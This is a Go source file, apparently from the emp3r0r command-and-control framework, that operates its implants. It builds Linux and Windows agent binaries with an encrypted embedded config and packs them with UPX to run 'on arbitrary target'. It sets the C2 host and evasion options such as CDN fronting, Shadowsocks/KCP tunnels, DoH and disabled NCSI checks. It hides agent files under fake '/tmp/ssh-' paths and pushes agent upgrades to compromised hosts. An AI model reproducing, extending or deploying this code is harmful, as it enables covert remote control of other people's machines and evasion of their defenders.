package cc

import (
	"bytes"
	"encoding/json"
	"fmt"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/bettercap/readline"
	"github.com/google/uuid"
	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

var Arch_List = []string{
	"386",
	"amd64",
	"arm",
	"arm64",
	"mips",
	"mips64",
	"riscv64",
}

// a wrapper for CmdFuncs
func genAgentWrapper() {
	CliPrint("Generated agent binary: %s."+
		"You can `use stager` to generate a one liner for your target host", GenAgent())
}

func GenAgent() (agent_binary_path string) {
	var (
		outfile     string           // write agent binary to this path
		arch_choice string = "amd64" // CPU architecture
	)
	now := time.Now()
	stubFile := fmt.Sprintf("%s-%s", emp3r0r_data.Stub_Linux, arch_choice)
	os_choice := CliAsk("Generate agent for (1) Linux, (2) Windows: ", false)
	is_win := os_choice == "2"
	is_linux := os_choice == "1"
	if is_linux {
		CliPrintInfo("You chose Linux")
		for n, arch := range Arch_List {
			CliPrint("[%d] %s", n, arch)
		}
		arch_choice_index, err := strconv.Atoi(CliAsk("Generate for: ", false))
		if err != nil {
			CliPrintError("Invalid index number: %v", err)
			return
		}
		arch_choice = Arch_List[arch_choice_index]
		CliPrintInfo("Generating agent for %s platform", arch_choice)
		stubFile = fmt.Sprintf("%s-%s", emp3r0r_data.Stub_Linux, arch_choice)
		outfile = fmt.Sprintf("%s/agent_linux_%s_%d-%d-%d_%d-%d-%d",
			EmpWorkSpace, arch_choice,
			now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second())
	}
	if is_win {
		CliPrintInfo("You chose Windows")
		if CliYesNo("Generate for 32 bit Windows") {
			arch_choice = "386"
		}
		stubFile = fmt.Sprintf("%s-%s", emp3r0r_data.Stub_Windows, arch_choice)
		outfile = fmt.Sprintf("%s/agent_windows_%s_%d-%d-%d_%d-%d-%d.exe",
			EmpWorkSpace, arch_choice,
			now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second())
	}

	if !util.IsExist(stubFile) {
		CliPrintError("%s not found, build it first", stubFile)
		return
	}

	// fill emp3r0r.json
	err := PromptForConfig(true)
	if err != nil {
		CliPrintError("Failed to configure agent: %v", err)
		return
	}

	// read file
	jsonBytes, err := os.ReadFile(EmpConfigFile)
	if err != nil {
		CliPrintError("Parsing EmpConfigFile config file: %v", err)
		return
	}

	// encrypt
	key := tun.GenAESKey(string(emp3r0r_data.OneTimeMagicBytes))
	encryptedJSONBytes := tun.AESEncryptRaw(key, jsonBytes)
	if encryptedJSONBytes == nil {
		CliPrintError("Failed to encrypt %s with key %s", EmpConfigFile, key)
		return
	}

	// write
	toWrite, err := os.ReadFile(stubFile)
	if err != nil {
		CliPrintError("Read stub: %v", err)
		return
	}
	sep := bytes.Repeat(emp3r0r_data.OneTimeMagicBytes, 3)

	// payload
	config_payload := append(sep, encryptedJSONBytes...)
	config_payload = append(config_payload, sep...)
	// fill in
	toWrite = bytes.Replace(toWrite,
		bytes.Repeat([]byte{0}, len(config_payload)),
		config_payload,
		1)
	// write
	err = os.WriteFile(outfile, toWrite, 0755)
	if err != nil {
		CliPrintError("Save agent binary %s: %v", outfile, err)
		return
	}

	// done
	CliPrintSuccess("Generated %s from %s and %s, you can run %s on arbitrary target",
		outfile, stubFile, EmpConfigFile, outfile)
	agent_binary_path = outfile

	// pack it with upx
	packed_file := fmt.Sprintf("%s.packed", outfile)
	err = upx(outfile, packed_file)
	if err != nil {
		CliPrintWarning("UPX: %v", err)
		return
	}

	// append magic_str so it will still extract config data
	packed_bin_data, err := os.ReadFile(packed_file)
	if err != nil {
		CliPrintError("Failed to read UPX packed file: %v", err)
		return
	}
	toWrite = append(packed_bin_data, sep...)
	toWrite = append(toWrite, encryptedJSONBytes...)
	toWrite = append(toWrite, sep...)
	err = os.WriteFile(packed_file, toWrite, 0755)
	if err != nil {
		CliPrintError("Failed to save final agent binary: %v", err)
		return
	}

	agent_binary_path = packed_file

	return
}

// PackAgentBinary pack agent ELF binary with Packer()
func PackAgentBinary() {
	// completer
	compls := []readline.PrefixCompleterInterface{
		readline.PcItemDynamic(listLocalFiles("./"))}
	CliCompleter.SetChildren(compls)
	defer CliCompleter.SetChildren(CmdCompls)

	// ask
	answ := CliAsk("Path to agent binary: ", false)

	go func() {
		err := Packer(answ)
		if err != nil {
			CliPrintError("PackAgentBinary: %v", err)
		}
	}()
}

func UpgradeAgent() {
	if !util.IsExist(WWWRoot + "agent") {
		CliPrintWarning("%s/agent not found, we need to rebuild an agent binary", WWWRoot)
		agent_bin := GenAgent()
		err := util.Copy(agent_bin, WWWRoot+"agent")
		if err != nil {
			CliPrintError("Copying agent binary to %s: %v", WWWRoot, err)
			return
		}
	}
	checksum := tun.SHA256SumFile(WWWRoot + "agent")
	SendCmdToCurrentTarget(fmt.Sprintf("%s %s", emp3r0r_data.C2CmdUpdateAgent, checksum), "")
}

// PromptForConfig prompt user for emp3r0r config, and write emp3r0r.json
// isAgent: whether we are building a agent binary
func PromptForConfig(isAgent bool) (err error) {
	// read existing config when possible
	var (
		jsonData   []byte
		config_map map[string]interface{}
	)
	if util.IsExist(EmpConfigFile) {
		CliPrintInfo("Reading config from existing %s", EmpConfigFile)
		jsonData, err = os.ReadFile(EmpConfigFile)
		if err != nil {
			CliPrintWarning("failed to read %s: %v", EmpConfigFile, err)
		}
		// load to map
		err = json.Unmarshal(jsonData, &config_map)
		if err != nil {
			CliPrintWarning("Parsing existing %s: %v", EmpConfigFile, err)
		}
	}

	// read existing emp3r0r.json
	read_from_cached := func(config_key string, silently_use bool) (val interface{}, err error) {
		// ask
		exists := false
		val, exists = config_map[config_key]
		if !exists {
			err = fmt.Errorf("%s not found in JSON config", config_key)
			return
		}
		if silently_use {
			return
		}
		if CliYesNo(
			fmt.Sprintf("Use cached %s (%v)",
				strconv.Quote(config_key), val)) {
			CliMsg("Using cached '%v' for %s", val, strconv.Quote(config_key))
			return
		}
		CliPrintInfo("You have chosen NO")
		return nil, nil
	}

	ask := func(prompt, config_key string) (answer interface{}) {
		val, err := read_from_cached(config_key, false)
		if err != nil {
			CliPrintWarning("Read from cached %s: %v", EmpConfigFile, err)
		} else if val != nil {
			answer = val
			return
		}

		// ask
		answer = CliAsk(fmt.Sprintf("%s (%s): ", prompt, config_key), false)
		ans_int, err := strconv.Atoi(answer.(string))
		if err == nil {
			answer = ans_int
		}
		return
	}

	// ask a few questions
	// CC names and certs
	var ans string
	if !isAgent {
		ans = ask("CC host(s), can be one or more IPs or domain names, separate with space\n", "cc_host").(string)
	} else {
		ans = ask("CC host for agent to connect to, can be an IP or a domain name", "cc_host").(string)
	}
	cc_hosts := strings.Fields(ans)
	RuntimeConfig.CCHost = cc_hosts[0]
	existing_names := tun.NamesInCert(ServerCrtFile)
	exists := false
	for _, c2_name := range existing_names {
		if c2_name == RuntimeConfig.CCHost {
			exists = true
			break
		}
	}
	// if user is requesting a new server name, server cert needs to be re-generated
	if !exists {
		CliPrintWarning("Name '%s' is not covered by our server cert, re-generating",
			RuntimeConfig.CCHost)
		cc_hosts = append(cc_hosts, existing_names...) // append new name
		// remove old certs
		os.RemoveAll(ServerCrtFile)
		os.RemoveAll(ServerKeyFile)
		err = GenC2Certs(cc_hosts)
		if err != nil {
			return fmt.Errorf("GenAgent: failed to generate certs: %v", err)
		}
		err = EmpTLSServer.Shutdown(EmpTLSServerCtx)
		if err != nil {
			CliPrintError("%v. You will need to restart emp3r0r C2 server to apply name '%s'",
				err, RuntimeConfig.CCHost)
		} else {
			CliPrintWarning("Restarting C2 TLS service at port %s to apply new server cert", RuntimeConfig.CCPort)
			go TLSServer()
		}
	}

	// if building CC, we can safely ignore varibles below
	if !isAgent {
		return
	}
	if CliYesNo("Enable CC indicator") {
		RuntimeConfig.CCIndicator =
			ask("Indicator URL, eg. https://example.com/ws/indicator.txt", "cc_indicator").(string)
		RuntimeConfig.CCIndicatorText =
			ask("Indicator text, eg. 'emp3r0r c2 is online'", "indicator_text").(string)
		CliMsg("Remember to put text %s in your indicator response",
			strconv.Quote(RuntimeConfig.CCIndicatorText))
	} else {
		RuntimeConfig.CCIndicator = ""
		RuntimeConfig.CCIndicatorText = ""
		RuntimeConfig.IndicatorWaitMax = 0
	}
	if CliYesNo("Disable NCSI connectivity checking (useful when C2 is reachable but NCSI is not)") {
		RuntimeConfig.DisableNCSI = true
	} else {
		RuntimeConfig.DisableNCSI = false
	}
	if CliYesNo("Enable CDN proxy") {
		RuntimeConfig.CDNProxy =
			ask("CDN proxy, eg. wss://example.com/ws/path", "cdn_proxy").(string)
	} else {
		RuntimeConfig.CDNProxy = ""
	}
	if CliYesNo("Enable Shadowsocks proxy " +
		"(C2 traffic will be encapsulated in Shadowsocks)") {
		RuntimeConfig.UseShadowsocks = true
		if CliYesNo("Enable KCP " +
			"(Shadowsocks traffic will be converted to UDP and go through KCP tunnel)") {
			RuntimeConfig.UseKCP = true
		} else {
			RuntimeConfig.UseKCP = false
		}
		RuntimeConfig.UseShadowsocks = true
	} else {
		RuntimeConfig.UseShadowsocks = false
		RuntimeConfig.UseKCP = false
	}
	if CliYesNo("Enable agent proxy (for C2 transport)") {
		RuntimeConfig.C2TransportProxy =
			ask("Agent proxy, eg. socks5://127.0.0.1:1080", "agent_proxy").(string)
	} else {
		RuntimeConfig.C2TransportProxy = ""
	}
	if CliYesNo("Set agent proxy timeout") {
		timeout, ok := ask("Timeout (in seconds, set to 0 to disable)", "autoproxy_timeout").(int)
		if !ok {
			CliPrintWarning("Invalid timeout, set to 0")
			timeout = 0
		}
		RuntimeConfig.AutoProxyTimeout = timeout
	} else {
		RuntimeConfig.C2TransportProxy = ""
	}
	if CliYesNo("Enable DoH (DNS over HTTPS)") {
		RuntimeConfig.DoHServer =
			ask("DoH server, eg. https://1.1.1.1/dns-query", "doh_server").(string)
	} else {
		RuntimeConfig.DoHServer = ""
	}
	if !CliYesNo("Enable autoproxy feature (will enable UDP broadcasting)") {
		RuntimeConfig.BroadcastIntervalMax = 0
	} else {
		RuntimeConfig.BroadcastIntervalMax = 120
	}

	// save emp3r0r.json
	return save_config_json()
}

// GenC2Certs generate certificates for CA and emp3r0r C2 server
func GenC2Certs(hosts []string) (err error) {
	if !util.IsFileExist(CAKeyFile) || !util.IsFileExist(CACrtFile) {
		CliPrint("CA cert not found, generating...")
		err = tun.GenCerts(nil, "", true)
		if err != nil {
			return fmt.Errorf("Generate CA: %v", err)
		}
		CliPrintInfo("CA fingerprint: %s", RuntimeConfig.CAFingerprint)
	}
	if !util.IsFileExist(CAKeyFile) || !util.IsFileExist(CACrtFile) {
		return fmt.Errorf("%s or %s still not found, CA cert generation failed", CAKeyFile, CACrtFile)
	}

	// save CA cert to emp3r0r.json
	err = LoadCACrt()
	if err != nil {
		return fmt.Errorf("GenC2Certs failed to load CA to RuntimeConfig: %v", err)
	}

	// generate server cert
	CliPrint("Server cert not found, generating...")
	CliPrintInfo("Server cert fingerprint: %s", tun.GetFingerprint(ServerCrtFile))
	return tun.GenCerts(hosts, "emp3r0r", false)
}

func save_config_json() (err error) {
	err = LoadCACrt()
	if err != nil {
		return fmt.Errorf("save_config_json: %v", err)
	}
	w_data, err := json.Marshal(RuntimeConfig)
	if err != nil {
		return fmt.Errorf("Saving %s: %v", EmpConfigFile, err)
	}

	return os.WriteFile(EmpConfigFile, w_data, 0600)
}

func InitConfigFile(cc_host string) (err error) {
	// random ports
	RuntimeConfig.CCHost = cc_host
	RuntimeConfig.CCPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
	RuntimeConfig.AutoProxyPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
	RuntimeConfig.BroadcastPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
	RuntimeConfig.SSHDPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
	RuntimeConfig.ShadowsocksPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
	RuntimeConfig.KCPPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
	RuntimeConfig.HTTPListenerPort = fmt.Sprintf("%v", util.RandInt(1026, 65534))
	RuntimeConfig.Timeout = util.RandInt(10000, 20000)

	// SSH host key
	RuntimeConfig.SSHHostKey, _, err = tun.GenerateSSHKeyPair()
	if err != nil {
		return fmt.Errorf("failed to generate SSH host key: %v", err)
	}

	// random strings
	RuntimeConfig.AgentUUID = uuid.NewString()
	agent_root := util.RandStr(util.RandInt(6, 20))
	RuntimeConfig.AgentRoot = fmt.Sprintf("/tmp/ssh-%v", agent_root)
	utils_path := util.RandStr(util.RandInt(3, 20))
	RuntimeConfig.UtilsPath = fmt.Sprintf("%s/%v", RuntimeConfig.AgentRoot, utils_path)
	socket := util.RandStr(util.RandInt(3, 20))
	RuntimeConfig.SocketName = fmt.Sprintf("%s/%v", RuntimeConfig.AgentRoot, socket)
	pid_file := util.RandStr(util.RandInt(3, 20))
	RuntimeConfig.PIDFile = fmt.Sprintf("%s/%v", RuntimeConfig.AgentRoot, pid_file)
	RuntimeConfig.ShadowsocksPassword = util.RandStr(20)

	// time intervals
	RuntimeConfig.BroadcastIntervalMin = 30
	RuntimeConfig.BroadcastIntervalMax = 130
	RuntimeConfig.IndicatorWaitMin = 30
	RuntimeConfig.IndicatorWaitMax = 130
	RuntimeConfig.AutoProxyTimeout = 0 // disable timeout by default, leave it to the OS

	return save_config_json()
}

// LoadCACrt load CA cert from file
func LoadCACrt() error {
	// CA cert
	ca_data, err := os.ReadFile(CACrtFile)
	if err != nil {
		return fmt.Errorf("failed to read CA cert: %v", err)
	}
	tun.CACrt = ca_data
	RuntimeConfig.CAPEM = string(tun.CACrt)
	RuntimeConfig.CAFingerprint = tun.GetFingerprint(CACrtFile)
	return nil
}
